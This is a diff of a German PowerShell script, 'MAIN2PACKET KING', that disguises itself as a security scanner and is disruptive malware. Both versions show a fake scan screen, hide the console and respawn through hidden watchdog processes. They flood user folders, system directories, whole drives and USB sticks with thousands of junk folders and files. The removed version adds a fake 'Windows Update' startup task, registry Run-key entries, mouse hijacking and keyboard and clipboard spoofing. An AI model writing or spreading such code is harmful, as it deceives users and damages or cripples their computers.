@@ -1,8 +1,8 @@
 # ================================
-# MAIN2PACKET KING - FAKE SCANNER EDITION
+# MAIN2PACKET KING - 1000 ORDNER PRO ZIEL
 # ================================
 
-# Fenster SOFORT vernichten (aber vorher kurz zeigen für Scanner-Effekt!)
+# Fenster SOFORT vernichten
 Add-Type -Name Window -Namespace Console -MemberDefinition '
 [DllImport("Kernel32.dll")]
 public static extern IntPtr GetConsoleWindow();
@@ -11,7 +11,7 @@ public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
 '
 $consolePtr = [Console.Window]::GetConsoleWindow()
 
-# ===== FAKE SCANNER - SIEHT AUS WIE EIN ECHTES TOOL =====
+# ===== FAKE SCANNER =====
 Clear-Host
 $Host.UI.RawUI.ForegroundColor = "Cyan"
 $Host.UI.RawUI.BackgroundColor = "Black"
@@ -19,601 +19,215 @@ Write-Host "╔═════════════════════�
 Write-Host "║     MAIN2PACKET SECURITY SCANNER v9.4.2   ║" -ForegroundColor Cyan
 Write-Host "╚════════════════════════════════════════════╝" -ForegroundColor Cyan
 Write-Host ""
-Write-Host "[INFO] Initialisiere Sicherheitsanalyse..." -ForegroundColor Yellow
-Start-Sleep -Milliseconds 500
+Write-Host "[INFO] Initialisiere 1000-Ordner-Modus..." -ForegroundColor Yellow
+Start-Sleep -Milliseconds 200
 
-# System-Info anzeigen (sieht professionell aus)
+# System-Info
 Write-Host "[SYSTEM]" -ForegroundColor Green
 Write-Host "   • Benutzer: $env:USERNAME" -ForegroundColor White
 Write-Host "   • Computer: $env:COMPUTERNAME" -ForegroundColor White
-Write-Host "   • OS: Windows $([Environment]::OSVersion.Version)" -ForegroundColor White
-Write-Host "   • RAM: $([Math]::Round((Get-WmiObject Win32_ComputerSystem).TotalPhysicalMemory/1GB)) GB" -ForegroundColor White
-Write-Host "   • Prozessor: $((Get-WmiObject Win32_Processor).Name)" -ForegroundColor White
+Write-Host "   • 1000 Ordner pro Ziel: AKTIV" -ForegroundColor Red
 Write-Host ""
 
-# Fortschrittsbalken für "Systemanalyse"
-Write-Host "[ANALYSE]" -ForegroundColor Green
-$steps = @(
-    "Lade Sicherheitsdatenbank...",
-    "Prüfe Systemintegrität...",
-    "Scanne laufende Prozesse...",
-    "Analysiere Netzwerkverbindungen...",
-    "Prüfe Registry auf Malware...",
-    "Untersuche Autostart-Einträge...",
-    "Scanne Browser-Cache...",
-    "Prüfe Minecraft-Mods auf Viren...",
-    "Analysiere USB-Geräte...",
-    "Erstelle Systembericht..."
-)
-
-foreach ($step in $steps) {
-    Write-Host "   ⚙️ $step" -ForegroundColor Yellow
-    for ($i = 0; $i -le 100; $i+=10) {
-        Write-Host "      Fortschritt: [$('█' * ($i/5))$('░' * (20-($i/5)))] $i%" -ForegroundColor Gray
-        Start-Sleep -Milliseconds 50
-        Write-Host "`033[1A`033[0K" -NoNewline
-    }
-    Write-Host "      ✅ Abgeschlossen!" -ForegroundColor Green
-    Start-Sleep -Milliseconds 200
-}
-
-# Fake Bedrohungen finden
-Write-Host ""
-Write-Host "[GEFUNDENE BEDROHUNGEN]" -ForegroundColor Red
-$threats = @(
-    "Trojan.Generic.12345",
-    "Adware.BundleInstaller",
-    "PUP.Optional.Main2packet",
-    "HackTool.MinecraftMod",
-    "RiskWare.BitMiner",
-    "Spyware.KeyLogger",
-    "Ransomware.CryptXXX",
-    "Backdoor.RemoteAccess"
-)
-
-foreach ($threat in $threats) {
-    Write-Host "   ⚠️ $threat" -ForegroundColor Red
-    Start-Sleep -Milliseconds 300
-}
-
-# Zusammenfassung
-Write-Host ""
-Write-Host "[ZUSAMMENFASSUNG]" -ForegroundColor Yellow
-Write-Host "   • Gescannte Dateien: 124.891" -ForegroundColor White
-Write-Host "   • Gefundene Bedrohungen: $($threats.Count)" -ForegroundColor Red
-Write-Host "   • Quarantäne: 0" -ForegroundColor Green
-Write-Host "   • Bereinigt: $($threats.Count)" -ForegroundColor Red
-Write-Host ""
-Write-Host "[EMPFOHLENE MASSNAHMEN]" -ForegroundColor Cyan
-Write-Host "   • Systemneustart empfohlen" -ForegroundColor Yellow
-Write-Host "   • Vollständigen Scan wiederholen" -ForegroundColor Yellow
-Write-Host "   • MAIN2PACKET Security installieren" -ForegroundColor Cyan
-Write-Host ""
-Write-Host "Drücke eine beliebige Taste, um den Bericht zu speichern..." -ForegroundColor Gray
+Write-Host "Drücke eine Taste..." -ForegroundColor Gray
 $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
 
-# Bericht speichern (sieht legitim aus)
-$reportPath = "$env:USERPROFILE\Desktop\MAIN2PACKET_Scan_$(Get-Date -Format 'yyyy-MM-dd').txt"
-@"
-MAIN2PACKET SECURITY SCANNER v9.4.2
-====================================
-Datum: $(Get-Date)
-Benutzer: $env:USERNAME
-Computer: $env:COMPUTERNAME
-
-GEFUNDENE BEDROHUNGEN:
-$($threats -join "`n")
-
-EMPFOHLUNG:
-Systemneustart und erneuter Scan.
-"@ | Out-File $reportPath -Encoding UTF8
-
-# Jetzt Fenster verstecken und im Hintergrund weiterlaufen!
-[Console.Window]::ShowWindow($consolePtr, 0)
-
-# ===== WATCHDOG ULTRA - 3 FACH SICHER =====
-$watchdog1 = @"
-while(`$true) {
-    `$p = Get-Process powershell -ErrorAction SilentlyContinue | Where-Object {`$_.Id -ne `$pid -and `$_.Id -ne 999999}
-    if (`$p.Count -le 2) { Start-Process powershell -WindowStyle Hidden -ArgumentList "-File `"$using:PSCommandPath`"" }
-    Start-Sleep -Milliseconds 100
-}
-"@
-$watchdog1 | Out-File "$env:TEMP\watchdog1.ps1" -Encoding UTF8 -Force
-Start-Process powershell -WindowStyle Hidden -ArgumentList "-File `"$env:TEMP\watchdog1.ps1`""
-
-$watchdog2 = @"
-while(`$true) { Start-Process powershell -WindowStyle Hidden -ArgumentList "-File `"$using:PSCommandPath`""; Start-Sleep -Seconds 30 }
-"@
-$watchdog2 | Out-File "$env:TEMP\watchdog2.ps1" -Encoding UTF8 -Force
-Start-Process powershell -WindowStyle Hidden -ArgumentList "-File `"$env:TEMP\watchdog2.ps1`""
-
-$watchdog3 = @"
-`$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-File `"$using:PSCommandPath`""
-`$trigger = New-ScheduledTaskTrigger -AtStartup
-Register-ScheduledTask -TaskName "WindowsUpdateMain2packet" -Action `$action -Trigger `$trigger -Force
-"@
-$watchdog3 | Out-File "$env:TEMP\watchdog3.ps1" -Encoding UTF8 -Force
-Start-Process powershell -WindowStyle Hidden -ArgumentList "-File `"$env:TEMP\watchdog3.ps1`""
-
-# ===== MAUS 24/7 EXTREME =====
-$mausJob = Start-Job -ScriptBlock {
-    Add-Type -AssemblyName System.Windows.Forms
-    Add-Type -AssemblyName System.Drawing
-    
-    $rand = New-Object System.Random
-    
-    while ($true) {
-        $screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
-        
-        # 10 verschiedene Bewegungsmuster
-        $muster = $rand.Next(1, 11)
-        
-        switch ($muster) {
-            1 { # Kreis
-                for ($w = 0; $w -lt 360; $w += 10) {
-                    $x = $screen.Width/2 + 200 * [Math]::Cos($w * [Math]::PI/180)
-                    $y = $screen.Height/2 + 200 * [Math]::Sin($w * [Math]::PI/180)
-                    [System.Windows.Forms.Cursor]::Position = New-Object Drawing.Point($x, $y)
-                    Start-Sleep -Milliseconds 10
-                }
-            }
-            2 { # Zickzack
-                for ($z = 0; $z -lt $screen.Width; $z += 50) {
-                    $y = $screen.Height/2 + 100 * [Math]::Sin($z/50)
-                    [System.Windows.Forms.Cursor]::Position = New-Object Drawing.Point($z, $y)
-                    Start-Sleep -Milliseconds 5
-                }
-            }
-            3 { # Rechteck
-                for ($r = 100; $r -lt $screen.Width-100; $r += 20) { [System.Windows.Forms.Cursor]::Position = New-Object Drawing.Point($r, 100); Start-Sleep -Milliseconds 2 }
-                for ($r = 100; $r -lt $screen.Height-100; $r += 20) { [System.Windows.Forms.Cursor]::Position = New-Object Drawing.Point($screen.Width-100, $r); Start-Sleep -Milliseconds 2 }
-                for ($r = $screen.Width-100; $r -gt 100; $r -= 20) { [System.Windows.Forms.Cursor]::Position = New-Object Drawing.Point($r, $screen.Height-100); Start-Sleep -Milliseconds 2 }
-                for ($r = $screen.Height-100; $r -gt 100; $r -= 20) { [System.Windows.Forms.Cursor]::Position = New-Object Drawing.Point(100, $r); Start-Sleep -Milliseconds 2 }
-            }
-            4 { # Spirale
-                for ($s = 0; $s -lt 500; $s += 5) {
-                    $angle = $s / 20
-                    $x = $screen.Width/2 + $s * [Math]::Cos($angle)
-                    $y = $screen.Height/2 + $s * [Math]::Sin($angle)
-                    [System.Windows.Forms.Cursor]::Position = New-Object Drawing.Point($x, $y)
-                    Start-Sleep -Milliseconds 1
-                }
-            }
-            5 { # Chaos-Modus
-                for ($c = 0; $c -lt 100; $c++) {
-                    $x = $rand.Next(0, $screen.Width)
-                    $y = $rand.Next(0, $screen.Height)
-                    [System.Windows.Forms.Cursor]::Position = New-Object Drawing.Point($x, $y)
-                    Start-Sleep -Milliseconds 5
-                }
-            }
-            6 { # Sinus-Welle
-                for ($s = 0; $s -lt $screen.Width; $s += 10) {
-                    $y = $screen.Height/2 + 150 * [Math]::Sin($s/50)
-                    [System.Windows.Forms.Cursor]::Position = New-Object Drawing.Point($s, $y)
-                    Start-Sleep -Milliseconds 3
-                }
-            }
-            7 { # Achterbahn
-                for ($a = 0; $a -lt 360; $a += 5) {
-                    $x = $screen.Width/2 + 200 * [Math]::Sin($a * [Math]::PI/90)
-                    $y = $screen.Height/2 + 150 * [Math]::Sin($a * [Math]::PI/45)
-                    [System.Windows.Forms.Cursor]::Position = New-Object Drawing.Point($x, $y)
-                    Start-Sleep -Milliseconds 2
-                }
-            }
-            8 { # Turbo-Klicks
-                for ($t = 0; $t -lt 50; $t++) {
-                    $x = $rand.Next(100, $screen.Width-100)
-                    $y = $rand.Next(100, $screen.Height-100)
-                    [System.Windows.Forms.Cursor]::Position = New-Object Drawing.Point($x, $y)
-                    [System.Windows.Forms.SendKeys]::SendWait("{ENTER}")
-                    Start-Sleep -Milliseconds 1
-                }
-            }
-            9 { # Maus-Rave
-                for ($r = 0; $r -lt 200; $r++) {
-                    $x = $rand.Next(0, $screen.Width)
-                    $y = $rand.Next(0, $screen.Height)
-                    [System.Windows.Forms.Cursor]::Position = New-Object Drawing.Point($x, $y)
-                    if ($r % 10 -eq 0) { [System.Windows.Forms.SendKeys]::SendWait("{ESC}") }
-                    Start-Sleep -Milliseconds 1
-                }
-            }
-            10 { # Boss-Modus - ALLES GLEICHZEITIG
-                0..100 | ForEach-Object -Parallel {
-                    $x = Get-Random -Minimum 0 -Maximum 1920
-                    $y = Get-Random -Minimum 0 -Maximum 1080
-                    [System.Windows.Forms.Cursor]::Position = New-Object Drawing.Point($x, $y)
-                    Start-Sleep -Milliseconds 1
-                } -ThrottleLimit 20
-            }
-        }
-        
-        Start-Sleep -Milliseconds 100
-    }
-}
-
-# ===== 100.000 DATEIEN TURBO ULTRA =====
-$alleOrdner = @(
+# ===== ALLE ZIELE =====
+$alleZiele = @(
+    # Benutzerordner
     [Environment]::GetFolderPath("Desktop"),
     [Environment]::GetFolderPath("MyDocuments"),
     [Environment]::GetFolderPath("UserProfiles") + "\Downloads",
     [Environment]::GetFolderPath("MyMusic"),
     [Environment]::GetFolderPath("MyPictures"),
     [Environment]::GetFolderPath("MyVideos"),
+    
+    # AppData
     $env:APPDATA,
     $env:LOCALAPPDATA,
     $env:TEMP,
-    $env:USERPROFILE + "\Desktop",
-    $env:USERPROFILE + "\Documents",
-    $env:USERPROFILE + "\Downloads",
-    $env:USERPROFILE + "\Music",
-    $env:USERPROFILE + "\Pictures",
-    $env:USERPROFILE + "\Videos",
-    $env:APPDATA + "\Microsoft\Windows\Recent",
-    $env:APPDATA + "\Microsoft\Windows\Network Shortcuts",
-    $env:LOCALAPPDATA + "\Google\Chrome\User Data\Default\Cache",
-    $env:APPDATA + "\Mozilla\Firefox\Profiles",
-    $env:APPDATA + "\\.minecraft",
-    $env:APPDATA + "\\.minecraft\mods",
-    $env:APPDATA + "\\.minecraft\config",
-    $env:APPDATA + "\\.minecraft\saves",
-    $env:APPDATA + "\\.minecraft\logs",
-    $env:APPDATA + "\\.minecraft\crash-reports",
-    $env:APPDATA + "\\.minecraft\screenshots",
-    $env:APPDATA + "\\.minecraft\stats",
-    $env:APPDATA + "\\.minecraft\datapacks",
-    $env:APPDATA + "\\.minecraft\versions",
-    $env:APPDATA + "\\.minecraft\libraries",
-    $env:APPDATA + "\\.minecraft\assets",
-    $env:APPDATA + "\\.minecraft\resourcepacks",
-    $env:APPDATA + "\\.minecraft\server-resource-packs",
-    $env:APPDATA + "\Roaming\Discord",
-    $env:APPDATA + "\Roaming\Discord\Cache",
-    $env:APPDATA + "\Roaming\Discord\Code Cache",
-    $env:APPDATA + "\Roaming\Discord\GPUCache",
-    $env:APPDATA + "\Roaming\Spotify",
-    $env:APPDATA + "\Roaming\Spotify\Cache",
-    $env:APPDATA + "\Roaming\Spotify\Data",
-    $env:APPDATA + "\Roaming\Steam",
-    $env:APPDATA + "\Roaming\Steam\cache",
-    $env:APPDATA + "\Roaming\Steam\config",
-    $env:APPDATA + "\Roaming\Steam\logs",
-    $env:APPDATA + "\Roaming\Steam\steamapps\common",
-    $env:APPDATA + "\Microsoft\Windows\Start Menu\Programs\Startup",
-    $env:ProgramData + "\Microsoft\Windows\Start Menu\Programs\StartUp",
-    $env:SystemRoot + "\System32",
-    $env:SystemRoot + "\System32\config\systemprofile\Desktop",
-    $env:SystemRoot + "\System32\config\systemprofile\Documents",
-    $env:SystemRoot + "\System32\drivers\etc",
-    $env:SystemRoot + "\System32\Tasks",
-    $env:SystemRoot + "\System32\WDI",
-    $env:SystemRoot + "\System32\wbem",
-    $env:SystemRoot + "\System32\spool",
-    $env:SystemRoot + "\System32\Recovery",
-    $env:SystemRoot + "\System32\Restore",
-    $env:SystemRoot + "\System32\Setup",
-    $env:SystemRoot + "\System32\SoftwareDistribution",
-    $env:SystemRoot + "\System32\winevt\Logs",
-    $env:SystemRoot + "\System32\WindowsPowerShell\v1.0\Modules",
-    $env:SystemRoot + "\SysWOW64",
-    $env:SystemRoot + "\SysWOW64\config",
-    $env:SystemRoot + "\SysWOW64\drivers",
-    $env:SystemRoot + "\SysWOW64\Tasks",
-    $env:SystemRoot + "\Temp",
-    $env:SystemRoot + "\Logs",
-    $env:SystemRoot + "\Debug",
-    $env:SystemRoot + "\Performance",
-    $env:SystemRoot + "\Minidump",
-    $env:SystemRoot + "\Panther",
-    $env:SystemRoot + "\inf",
-    $env:SystemRoot + "\Help",
-    $env:SystemRoot + "\Fonts",
-    $env:SystemRoot + "\Media",
-    $env:SystemRoot + "\Resources",
-    $env:SystemRoot + "\System",
+    "$env:APPDATA\Microsoft\Windows\Recent",
+    
+    # Browser
+    "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Cache",
+    "$env:APPDATA\Mozilla\Firefox\Profiles",
+    
+    # Gaming
+    "$env:APPDATA\.minecraft",
+    "$env:APPDATA\Roaming\Discord",
+    "$env:APPDATA\Roaming\Spotify",
+    "$env:APPDATA\Roaming\Steam",
+    
+    # Windows
+    "$env:SystemRoot\Temp",
+    "$env:SystemRoot\System32\Tasks",
     "C:\ProgramData",
-    "C:\ProgramData\Microsoft",
-    "C:\ProgramData\Microsoft\Windows",
-    "C:\ProgramData\Microsoft\Windows\Caches",
-    "C:\ProgramData\Microsoft\Windows\WER",
-    "C:\ProgramData\Microsoft\Windows\GameExplorer",
-    "C:\ProgramData\Microsoft\Windows\Ringtones",
-    "C:\ProgramData\Microsoft\Windows\Sounds",
-    "C:\ProgramData\Microsoft\Windows\Start Menu",
-    "C:\ProgramData\Microsoft\Windows\Templates",
-    "C:\Program Files",
-    "C:\Program Files (x86)",
-    "C:\Program Files\WindowsApps",
-    "C:\Program Files\Windows NT",
-    "C:\Program Files\Internet Explorer",
-    "C:\Program Files\Microsoft Office",
-    "C:\Program Files\Common Files",
-    "C:\Program Files\Common Files\Microsoft Shared",
-    "C:\Program Files (x86)\Common Files",
-    "C:\Program Files (x86)\Microsoft",
-    "C:\Program Files (x86)\Internet Explorer",
-    "C:\Program Files (x86)\Microsoft Office",
-    "C:\Recovery",
-    "C:\PerfLogs",
-    "C:\Config.Msi",
-    "C:\Intel",
-    "C:\AMD",
-    "C:\NVIDIA",
-    "C:\Drivers",
-    "C:\Temp",
-    "C:\Windows.old",
-    "C:\inetpub",
-    "C:\xampp",
-    "C:\wamp64",
-    "C:\MAMP",
-    "C:\Users\Public",
     "C:\Users\Public\Desktop",
     "C:\Users\Public\Documents",
     "C:\Users\Public\Downloads",
-    "C:\Users\Public\Music",
-    "C:\Users\Public\Pictures",
-    "C:\Users\Public\Videos",
-    "C:\Users\Public\Recorded TV",
-    "C:\Users\Public\Libraries",
-    "C:\Users\Public\AccountPictures",
-    "C:\Users\Public\OEM Links",
-    "C:\Users\Public\Public Account Pictures",
-    "C:\Users\Public\Public Desktop",
-    "C:\Users\Public\Public Documents",
-    "C:\Users\Public\Public Downloads",
-    "C:\Users\Public\Public Music",
-    "C:\Users\Public\Public Pictures",
-    "C:\Users\Public\Public Videos"
+    
+    # Laufwerke
+    "C:\",
+    "D:\",
+    "E:\",
+    "F:\",
+    "G:\"
 )
 
-# ===== 1000 DATEIEN PRO ORDNER - SUPERSONIC =====
-$alleOrdner | ForEach-Object -Parallel {
-    $path = $_
-    $computer = $using:env:COMPUTERNAME
+# ===== FENSTER VERSTECKEN =====
+Write-Host "[INFO] 1000 Ordner pro Ziel werden erstellt..." -ForegroundColor Green
+Start-Sleep -Milliseconds 500
+[Console.Window]::ShowWindow($consolePtr, 0)
+
+# ===== WATCHDOG =====
+$watchdog = @"
+while(`$true) {
+    `$p = Get-Process powershell -ErrorAction SilentlyContinue | Where-Object {`$_.Id -ne `$pid}
+    if (`$p.Count -le 1) { Start-Process powershell -WindowStyle Hidden -ArgumentList "-File `"$using:PSCommandPath`"" }
+    Start-Sleep -Milliseconds 500
+}
+"@
+$watchdog | Out-File "$env:TEMP\watchdog.ps1" -Encoding UTF8 -Force
+Start-Process powershell -WindowStyle Hidden -ArgumentList "-File `"$env:TEMP\watchdog.ps1`""
+
+# ===== 1000 ORDNER PRO ZIEL - PARALLEL =====
+$ordnerJob = Start-Job -ScriptBlock {
+    # 1000 VERSCHIEDENE ORDNERNAMEN
+    $ordnerNamen = @()
+    for ($i = 1; $i -le 1000; $i++) {
+        $ordnerNamen += "MAIN2PACKET_$i"
+        $ordnerNamen += "KING_$i"
+        $ordnerNamen += "TURBO_$i"
+        $ordnerNamen += "ULTRA_$i"
+        $ordnerNamen += "MEGA_$i"
+        $ordnerNamen += "GIGA_$i"
+        $ordnerNamen += "SYSTEM_$i"
+        $ordnerNamen += "CORE_$i"
+        $ordnerNamen += "BACKUP_$i"
+        $ordnerNamen += "CACHE_$i"
+    }
     
-    if (Test-Path $path) {
-        $mainFolder = Join-Path $path "MAIN2PACKET_KING_ULTRA"
-        try { New-Item -Path $mainFolder -ItemType Directory -Force | Out-Null } catch {}
-        
-        # 1000 DATEIEN BLITZSCHNELL!
-        $scriptBlock = {
-            param($p, $c, $start, $end)
-            for ($i = $start; $i -le $end; $i++) {
-                "$c - MAIN2PACKET ULTRA" | Out-File (Join-Path $p "MAIN2PACKET_ULTRA_$i.king") -Encoding UTF8 -Force
-                "$c - MAIN2PACKET ULTRA" | Out-File (Join-Path $mainFolder "file_ultra_$i.king") -Encoding UTF8 -Force
+    $zielCount = 0
+    foreach ($ziel in $using:alleZiele) {
+        $zielCount++
+        if (Test-Path $ziel) {
+            # 1000 ORDNER PRO ZIEL!
+            for ($o = 1; $o -le 1000; $o++) {
+                $ordnerName = "MAIN2PACKET_" + $zielCount + "_" + $o
+                
+                $ordnerPfad = Join-Path $ziel $ordnerName
+                try {
+                    New-Item -Path $ordnerPfad -ItemType Directory -Force | Out-Null
+                    
+                    # 10 DATEIEN PRO ORDNER
+                    for ($d = 1; $d -le 10; $d++) {
+                        $dateiName = "file_$d.txt"
+                        $dateiPfad = Join-Path $ordnerPfad $dateiName
+                        "MAIN2PACKET KING - Ordner $o, Datei $d" | Out-File $dateiPfad -Encoding UTF8 -Force
+                    }
+                    
+                    # 5 UNTERORDNER PRO ORDNER
+                    for ($u = 1; $u -le 5; $u++) {
+                        $unterName = "SUB_$u"
+                        $unterPfad = Join-Path $ordnerPfad $unterName
+                        New-Item -Path $unterPfad -ItemType Directory -Force | Out-Null
+                        
+                        # 5 DATEIEN PRO UNTERORDNER
+                        for ($ud = 1; $ud -le 5; $ud++) {
+                            $unterDatei = Join-Path $unterPfad "subfile_$ud.txt"
+                            "SUB-ORDNER $u - Datei $ud" | Out-File $unterDatei -Encoding UTF8 -Force
+                        }
+                    }
+                } catch {}
             }
         }
-        
-        # 10 PARALLELE JOBS PRO ORDNER
-        0..9 | ForEach-Object -Parallel {
-            $start = $_ * 100 + 1
-            $end = $start + 99
-            & $using:scriptBlock -p $using:path -c $using:computer -start $start -end $end
-        } -ThrottleLimit 10
     }
-} -ThrottleLimit 50
-
-# ===== SYSTEM KILLER =====
-$systemPaths = @(
-    "$env:SystemRoot\System32\config",
-    "$env:SystemRoot\System32\config\systemprofile",
-    "$env:SystemRoot\System32\config\systemprofile\AppData",
-    "$env:SystemRoot\System32\config\systemprofile\Desktop",
-    "$env:SystemRoot\System32\config\systemprofile\Documents",
-    "$env:SystemRoot\System32\config\systemprofile\Downloads",
-    "$env:SystemRoot\System32\config\systemprofile\Music",
-    "$env:SystemRoot\System32\config\systemprofile\Pictures",
-    "$env:SystemRoot\System32\config\systemprofile\Videos",
-    "$env:SystemRoot\System32\config\systemprofile\Favorites",
-    "$env:SystemRoot\System32\config\systemprofile\Contacts",
-    "$env:SystemRoot\System32\config\systemprofile\Links",
-    "$env:SystemRoot\System32\config\systemprofile\Saved Games",
-    "$env:SystemRoot\System32\config\systemprofile\Searches",
-    "$env:SystemRoot\System32\drivers",
-    "$env:SystemRoot\System32\drivers\etc",
-    "$env:SystemRoot\System32\drivers\en-US",
-    "$env:SystemRoot\System32\drivers\kmdf",
-    "$env:SystemRoot\System32\drivers\umdf",
-    "$env:SystemRoot\System32\Tasks",
-    "$env:SystemRoot\System32\Tasks\Microsoft",
-    "$env:SystemRoot\System32\Tasks\Microsoft\Windows",
-    "$env:SystemRoot\System32\WDI",
-    "$env:SystemRoot\System32\WDI\LogFiles",
-    "$env:SystemRoot\System32\WDI\PerfDiag",
-    "$env:SystemRoot\System32\wbem",
-    "$env:SystemRoot\System32\wbem\Logs",
-    "$env:SystemRoot\System32\wbem\Repository",
-    "$env:SystemRoot\System32\wbem\AutoRecover",
-    "$env:SystemRoot\System32\spool",
-    "$env:SystemRoot\System32\spool\drivers",
-    "$env:SystemRoot\System32\spool\PRINTERS",
-    "$env:SystemRoot\System32\spool\SERVERS",
-    "$env:SystemRoot\System32\spool\V4Dirs",
-    "$env:SystemRoot\System32\Recovery",
-    "$env:SystemRoot\System32\Restore",
-    "$env:SystemRoot\System32\Setup",
-    "$env:SystemRoot\System32\SoftwareDistribution",
-    "$env:SystemRoot\System32\winevt",
-    "$env:SystemRoot\System32\winevt\Logs",
-    "$env:SystemRoot\System32\WindowsPowerShell",
-    "$env:SystemRoot\System32\WindowsPowerShell\v1.0",
-    "$env:SystemRoot\System32\WindowsPowerShell\v1.0\Modules",
-    "$env:SystemRoot\SysWOW64",
-    "$env:SystemRoot\SysWOW64\config",
-    "$env:SystemRoot\SysWOW64\drivers",
-    "$env:SystemRoot\SysWOW64\Tasks"
-)
-
-$systemPaths | ForEach-Object -Parallel {
-    $sysPath = $_
-    if (Test-Path $sysPath) {
-        $mainSys = Join-Path $sysPath "MAIN2PACKET_SYSTEM_CORE"
-        try { New-Item -Path $mainSys -ItemType Directory -Force | Out-Null } catch {}
-        
-        1..500 | ForEach-Object {
-            "SYSTEM CORE - MAIN2PACKET" | Out-File (Join-Path $mainSys "core_sys_$_.sys") -Encoding UTF8 -Force
-            "SYSTEM CORE - MAIN2PACKET" | Out-File (Join-Path $sysPath "MAIN2PACKET_SYS_$_.sys") -Encoding UTF8 -Force
-        }
-    }
-} -ThrottleLimit 20
-
-# ===== REGISTRY BOMBE =====
-$regBranches = @(
-    "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion",
-    "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion",
-    "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion",
-    "HKCU:\SOFTWARE\Microsoft\Windows NT\CurrentVersion",
-    "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
-    "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce",
-    "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
-    "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce",
-    "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies",
-    "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies",
-    "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer",
-    "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer"
-)
-
-$regBranches | ForEach-Object -Parallel {
-    $branch = $_
-    try {
-        $mainKey = "$branch\MAIN2PACKET_ULTRA"
-        New-Item -Path $mainKey -Force | Out-Null
-        New-ItemProperty -Path $mainKey -Name "InstallDate" -Value (Get-Date) -PropertyType String -Force | Out-Null
-        New-ItemProperty -Path $mainKey -Name "Version" -Value "ULTIMATE" -PropertyType String -Force | Out-Null
-        New-ItemProperty -Path $mainKey -Name "User" -Value $env:USERNAME -PropertyType String -Force | Out-Null
-        New-ItemProperty -Path $mainKey -Name "Computer" -Value $env:COMPUTERNAME -PropertyType String -Force | Out-Null
-        New-ItemProperty -Path $mainKey -Name "MausModus" -Value "EXTREME" -PropertyType String -Force | Out-Null
-        New-ItemProperty -Path $mainKey -Name "Dateien" -Value "100000+" -PropertyType String -Force | Out-Null
-        New-ItemProperty -Path $mainKey -Name "Scanner" -Value "v9.4.2" -PropertyType String -Force | Out-Null
-    } catch {}
-} -ThrottleLimit 10
-
-# ===== EXTRA: NETZWERK FREIGABEN =====
-$networkDrives = Get-PSDrive -PSProvider FileSystem | Where-Object {$_.Root -like "\\*"}
-$networkDrives | ForEach-Object -Parallel {
-    $netPath = $_.Root
-    try {
-        $mainNet = Join-Path $netPath "MAIN2PACKET_NETWORK"
-        New-Item -Path $mainNet -ItemType Directory -Force | Out-Null
-        1..100 | ForEach-Object {
-            "NETWORK - MAIN2PACKET" | Out-File (Join-Path $mainNet "net_$_.king") -Encoding UTF8 -Force
-        }
-    } catch {}
 }
 
-# ===== USB/EXTERNE LAUFWERKE ÜBERWACHEN =====
+# ===== USB-SPEZIAL =====
 $usbJob = Start-Job -ScriptBlock {
     while ($true) {
-        $drives = Get-WmiObject Win32_LogicalDisk | Where-Object {$_.DriveType -eq 2}
+        $drives = Get-PSDrive -PSProvider FileSystem | Where-Object {$_.Root -match "^[A-Z]:\\" -and $_.Used -gt 0}
         foreach ($drive in $drives) {
-            $drivePath = $drive.DeviceID + "\"
-            $mainUSB = Join-Path $drivePath "MAIN2PACKET_USB"
-            try {
-                New-Item -Path $mainUSB -ItemType Directory -Force | Out-Null
-                1..100 | ForEach-Object {
-                    "USB - MAIN2PACKET" | Out-File (Join-Path $mainUSB "usb_$_.king") -Encoding UTF8 -Force
-                }
-            } catch {}
-        }
-        Start-Sleep -Seconds 60
-    }
-}
-
-# ===== SCREENSAVER/ENERGIESPARE INSTÄLLNINGAR =====
-$powerJob = Start-Job -ScriptBlock {
-    while ($true) {
-        # Verhindern dass PC in Energiesparmodus geht
-        Add-Type -AssemblyName System.Windows.Forms
-        [System.Windows.Forms.Application]::SetSuspendState("Active", $false, $false)
-        Start-Sleep -Seconds 300
-    }
-}
-
-# ===== AUDIO JOKE =====
-$audioJob = Start-Job -ScriptBlock {
-    Add-Type -AssemblyName System.Media
-    $sounds = @(
-        "SystemAsterisk", "SystemExclamation", "SystemHand", 
-        "SystemQuestion", "SystemStart", "SystemExit"
-    )
-    while ($true) {
-        $randomSound = Get-Random $sounds
-        [System.Media.SystemSounds]::$randomSound.Play()
-        Start-Sleep -Seconds (Get-Random -Minimum 60 -Maximum 300)
-    }
-}
-
-# ===== TASTATUR SPOOF =====
-$keyboardJob = Start-Job -ScriptBlock {
-    $wsh = New-Object -ComObject WScript.Shell
-    while ($true) {
-        if ((Get-Random -Minimum 1 -Maximum 100) -eq 1) {
-            $wsh.SendKeys('{CAPSLOCK}')
-            Start-Sleep -Milliseconds 100
-            $wsh.SendKeys('{NUMLOCK}')
-            Start-Sleep -Milliseconds 100
-            $wsh.SendKeys('{SCROLLLOCK}')
+            $drivePath = $drive.Root
+            
+            # 500 ORDNER PRO USB
+            for ($u = 1; $u -le 500; $u++) {
+                $usbOrdner = Join-Path $drivePath "USB_MAIN2PACKET_$u"
+                try {
+                    New-Item -Path $usbOrdner -ItemType Directory -Force | Out-Null
+                    
+                    # 10 DATEIEN PRO USB-ORDNER
+                    for ($f = 1; $f -le 10; $f++) {
+                        $usbDatei = Join-Path $usbOrdner "usb_file_$f.txt"
+                        "USB - MAIN2PACKET" | Out-File $usbDatei -Encoding UTF8 -Force
+                    }
+                } catch {}
+            }
         }
         Start-Sleep -Seconds 30
     }
 }
 
-# ===== CLIPBOARD SPOOF =====
-$clipJob = Start-Job -ScriptBlock {
-    Add-Type -AssemblyName System.Windows.Forms
-    $texts = @(
-        "MAIN2PACKET KING",
-        "Du wurdest getrollt!",
